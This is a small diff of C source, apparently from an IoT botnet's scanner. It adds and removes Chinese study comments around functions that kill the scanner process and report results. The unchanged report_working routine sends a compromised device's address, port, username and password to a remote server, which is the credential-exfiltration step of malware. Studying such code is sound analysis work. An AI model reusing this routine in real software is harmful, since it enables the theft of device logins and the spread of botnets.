@@ -645,6 +645,8 @@ void scanner_init(void)
     }
 }
 
+
+//kill掉canner进程
 void scanner_kill(void)
 {
     kill(scanner_pid, 9);//scanner_pid是fork的父进程的返回值，即子进程的ID
@@ -960,10 +962,10 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
     }
 
     uint8_t zero = 0;
-    send(fd, &zero, sizeof (uint8_t), MSG_NOSIGNAL);//发送zero干啥
+    send(fd, &zero, sizeof (uint8_t), MSG_NOSIGNAL);
     send(fd, &daddr, sizeof (ipv4_t), MSG_NOSIGNAL);
     send(fd, &dport, sizeof (uint16_t), MSG_NOSIGNAL);
-    send(fd, &(auth->username_len), sizeof (uint8_t), MSG_NOSIGNAL);    //发送length干啥？？？
+    send(fd, &(auth->username_len), sizeof (uint8_t), MSG_NOSIGNAL);    
     send(fd, auth->username, auth->username_len, MSG_NOSIGNAL);
     send(fd, &(auth->password_len), sizeof (uint8_t), MSG_NOSIGNAL);
     send(fd, auth->password, auth->password_len, MSG_NOSIGNAL);
